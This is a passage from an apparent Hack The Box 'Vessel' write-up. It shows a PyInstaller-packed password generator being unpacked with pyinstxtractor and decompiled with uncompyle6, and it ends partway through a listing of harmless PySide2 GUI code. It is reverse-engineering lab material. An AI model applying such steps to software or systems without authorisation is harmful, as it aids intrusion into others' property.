font-style: inherit;">%s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb22-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PyInstaller:</span> FormatMessageW failed.</span>
<span id="cb22-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PyInstaller:</span> pyi_win32_utils_to_utf8 failed.</span></code></pre></div>
<p><em>“PyInstaller reads a Python script written by you. It analyzes your code to discover every other module and library your script needs in order to execute. Then it collects copies of all those files – including the active Python interpreter! – and puts them with your script in a single folder, or optionally in a single executable file.”</em></p>
<p>Luckily for us, these files can be extracted using <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a>. Download pyinstxtractor to your Windows VM and extract the files from <code>passwordGenerator</code>.</p>
<div class="sourceCode" id="cb23" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb23-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\t</span>ools<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>yinstxtractor<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> python .<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>yinstxtractor.py C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>wn10<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>ocuments<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\h</span>tb<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\v</span>essel<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>asswordGenerator</span>
<span id="cb23-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Processing C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>wn10<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>ocuments<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\h</span>tb<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\v</span>essel<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>asswordGenerator</span>
<span id="cb23-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Pyinstaller version: 2.1+</span>
<span id="cb23-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Python version: 3.7</span>
<span id="cb23-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Length of package: 34300131 bytes</span>
<span id="cb23-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Found 95 files in CArchive</span>
<span id="cb23-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Beginning extraction...please standby</span>
<span id="cb23-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Possible entry point: pyiboot01_bootstrap.pyc</span>
<span id="cb23-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Possible entry point: pyi_rth_subprocess.pyc</span>
<span id="cb23-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Possible entry point: pyi_rth_pkgutil.pyc</span>
<span id="cb23-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Possible entry point: pyi_rth_inspect.pyc</span>
<span id="cb23-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Possible entry point: pyi_rth_pyside2.pyc</span>
<span id="cb23-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Possible entry point: passwordGenerator.pyc</span>
<span id="cb23-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[!]</span> Warning: This script is running in a different Python version than the one used to build the executable.</span>
<span id="cb23-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[!]</span> Please run this script in Python 3.7 to prevent extraction errors during unmarshalling</span>
<span id="cb23-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[!]</span> Skipping pyz extraction</span>
<span id="cb23-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Successfully extracted pyinstaller archive: C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>wn10<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>ocuments<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\h</span>tb<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\v</span>essel<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>asswordGenerator</span>
<span id="cb23-18"></span>
<span id="cb23-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">You</span> can now use a python decompiler on the pyc files within the extracted directory</span></code></pre></div>
<p>Notice the python version 3.7, I’m running 3.10 making the output not accurate. Download and install python 3.7 and try again.</p>
<div class="sourceCode" id="cb24" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb24-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\t</span>ools<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>yinstxtractor<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> python3.7.exe pyinstxtractor.py C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>wn10<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>ocuments<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\h</span>tb<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\v</span>essel<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>asswordGenerator       <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">+</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> Processing C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>wn10<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>ocuments<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\h</span>tb<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\v</span>essel<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>asswordGenerator</span>
<span id="cb24-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Pyinstaller version: 2.1+</span>
<span id="cb24-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Python version: 3.7</span>
<span id="cb24-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Length of package: 34300131 bytes</span>
<span id="cb24-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Found 95 files in CArchive</span>
<span id="cb24-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Beginning extraction...please standby</span>
<span id="cb24-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Possible entry point: pyiboot01_bootstrap.pyc</span>
<span id="cb24-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Possible entry point: pyi_rth_subprocess.pyc</span>
<span id="cb24-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Possible entry point: pyi_rth_pkgutil.pyc</span>
<span id="cb24-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Possible entry point: pyi_rth_inspect.pyc</span>
<span id="cb24-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Possible entry point: pyi_rth_pyside2.pyc</span>
<span id="cb24-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Possible entry point: passwordGenerator.pyc</span>
<span id="cb24-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Found 142 files in PYZ archive</span>
<span id="cb24-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Successfully extracted pyinstaller archive: C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>wn10<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>ocuments<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\h</span>tb<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\v</span>essel<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\p</span>asswordGenerator</span>
<span id="cb24-15"></span>
<span id="cb24-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">You</span> can now use a python decompiler on the pyc files within the extracted directory</span></code></pre></div>
<p>As stated on pyinstxtractor’s git, we now need to decompile the <code>.pyc</code> files, something we can do using <code>uncompyle6</code> or <code>decompyle3</code>.</p>
<div class="sourceCode" id="cb25" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb25-1">PS C:\<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> pip3 install uncompyle6</span>
<span id="cb25-2">Collecting uncompyle6</span>
<span id="cb25-3">  Using cached uncompyle6<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">3.8.0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>py310<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>none<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">any</span>.whl (<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">317</span> kB)</span>
<span id="cb25-4">Requirement already satisfied: spark<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>parser<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.9.0</span>,<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;=</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.8.9</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> c:\python310\lib\site<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>packages (<span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">from</span> uncompyle6) (<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.8.9</span>)</span>
<span id="cb25-5">Requirement already satisfied: xdis<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">6.1.0</span>,<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;=</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">6.0.2</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> c:\python310\lib\site<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>packages (<span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">from</span> uncompyle6) (<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">6.0.4</span>)</span>
<span id="cb25-6">Requirement already satisfied: click <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> c:\python310\lib\site<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>packages (<span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">from</span> spark<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>parser<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.9.0</span>,<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;=</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.8.9</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-&gt;</span>uncompyle6) (<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">8.1.3</span>)</span>
<span id="cb25-7">Requirement already satisfied: six<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;=</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.10.0</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> c:\python310\lib\site<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>packages (<span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">from</span> xdis<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">6.1.0</span>,<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;=</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">6.0.2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-&gt;</span>uncompyle6) (<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.16.0</span>)</span>
<span id="cb25-8">Requirement already satisfied: colorama <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> c:\python310\lib\site<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>packages (<span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">from</span> click<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-&gt;</span>spark<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>parser<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.9.0</span>,<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;=</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.8.9</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-&gt;</span>uncompyle6) (<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.4.5</span>)</span>
<span id="cb25-9">Installing collected packages: uncompyle6</span>
<span id="cb25-10">Successfully installed uncompyle6<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">3.8.0</span></span>
<span id="cb25-11"></span>
<span id="cb25-12">PS C:\tools\pyinstxtractor\passwordGenerator_extracted<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> uncompyle6 passwordGenerator.pyc <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> passwordGenerator.py</span>
<span id="cb25-13">PS C:\tools\pyinstxtractor\passwordGenerator_extracted<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> cat passwordGenerator.py</span>
<span id="cb25-14"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># uncompyle6 version 3.8.0</span></span>
<span id="cb25-15"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Python bytecode 3.7.0 (3394)</span></span>
<span id="cb25-16"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Decompiled from: Python 3.10.1 (tags/v3.10.1:2cd268a, Dec  6 2021, 19:10:37) [MSC v.1929 64 bit (AMD64)]</span></span>
<span id="cb25-17"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Embedded file name: passwordGenerator.py</span></span>
<span id="cb25-18"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">from</span> PySide2.QtCore <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span></span>
<span id="cb25-19"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">from</span> PySide2.QtGui <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span></span>
<span id="cb25-20"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">from</span> PySide2.QtWidgets <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span></span>
<span id="cb25-21"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">from</span> PySide2 <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> QtWidgets</span>
<span id="cb25-22"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> pyperclip</span>
<span id="cb25-23"></span>
<span id="cb25-24"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">class</span> Ui_MainWindow(<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">object</span>):</span>
<span id="cb25-25"></span>
<span id="cb25-26">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> setupUi(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>, MainWindow):</span>
<span id="cb25-27">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">not</span> MainWindow.objectName():</span>
<span id="cb25-28">            MainWindow.setObjectName(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MainWindow'</span>)</span>
<span id="cb25-29">        MainWindow.resize(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">560</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">408</span>)</span>
<span id="cb25-30">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.centralwidget <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QWidget(MainWindow)</span>
<span id="cb25-31">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.centralwidget.setObjectName(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'centralwidget'</span>)</span>
<span id="cb25-32">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.title <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QTextBrowser(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.centralwidget)</span>
<span id="cb25-33">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.title.setObjectName(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'title'</span>)</span>
<span id="cb25-34">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.title.setGeometry(QRect(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">80</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">411</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">51</span>))</span>
<span id="cb25-35">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_2 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QTextBrowser(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.centralwidget)</span>
<span id="cb25-36">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_2.setObjectName(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'textBrowser_2'</span>)</span>
<span id="cb25-37">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_2.setGeometry(QRect(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">80</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">161</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">41</span>))</span>
<span id="cb25-38">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.generate <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QPushButton(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.centralwidget)</span>
<span id="cb25-39">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.generate.setObjectName(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'generate'</span>)</span>
<span id="cb25-40">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.generate.setGeometry(QRect(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">140</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">330</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">261</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">51</span>))</span>
<span id="cb25-41">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.PasswordLength <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QSpinBox(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.centralwidget)</span>
<span id="cb25-42">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.PasswordLength.setObjectName(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'PasswordLength'</span>)</span>
<span id="cb25-43">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.PasswordLength.setGeometry(QRect(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">30</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">130</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">101</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">21</span>))</span>
<span id="cb25-44">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.PasswordLength.setMinimum(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>)</span>
<span id="cb25-45">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.PasswordLength.setMaximum(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">40</span>)</span>
<span id="cb25-46">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.copyButton <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QPushButton(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.centralwidget)</span>
<span id="cb25-47">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.copyButton.setObjectName(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'copyButton'</span>)</span>
<span id="cb25-48">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.copyButton.setGeometry(QRect(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">460</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">260</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">71</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">61</span>))</span>
<span id="cb25-49">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_4 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QTextBrowser(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.centralwidget)</span>
<span id="cb25-50">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_4.setObjectName(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'textBrowser_4'</span>)</span>
<span id="cb25-51">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_4.setGeometry(QRect(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">190</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">170</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">141</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">41</span>))</span>
<span id="cb25-52">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.checkBox <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QCheckBox(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.centralwidget)</span>
<span id="cb25-53">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.checkBox.setObjectName(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'checkBox'</span>)</span>
<span id="cb25-54">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.checkBox.setGeometry(QRect(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">250</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">220</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">16</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">17</span>))</span>
<span id="cb25-55">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.checkBox.setCheckable(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">True</span>)</span>
<span id="cb25-56">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.checkBox.setChecked(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">False</span>)</span>
<span id="cb25-57">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.checkBox.setTristate(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">False</span>)</span>
<span id="cb25-58">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.comboBox <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QComboBox(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.centralwidget)</span>
<span id="cb25-59">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.comboBox.addItem(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span>)</span>
<span id="cb25-60">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.comboBox.addItem(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span>)</span>
<span id="cb25-61">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.comboBox.addItem(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span>)</span>
<span id="cb25-62">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.comboBox.setObjectName(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'comboBox'</span>)</span>
<span id="cb25-63">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.comboBox.setGeometry(QRect(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">350</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">130</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">161</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">21</span>))</span>
<span id="cb25-64">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_5 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QTextBrowser(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.centralwidget)</span>
<span id="cb25-65">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_5.setObjectName(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'textBrowser_5'</span>)</span>
<span id="cb25-66">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_5.setGeometry(QRect(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">360</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">80</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">131</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">41</span>))</span>
<span id="cb25-67">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.password_field <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QLineEdit(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.centralwidget)</span>
<span id="cb25-68">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.password_field.setObjectName(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'password_field'</span>)</span>
<span id="cb25-69">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.password_field.setGeometry(QRect(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">100</span>, <span class="dv" style="color: #AD0000;
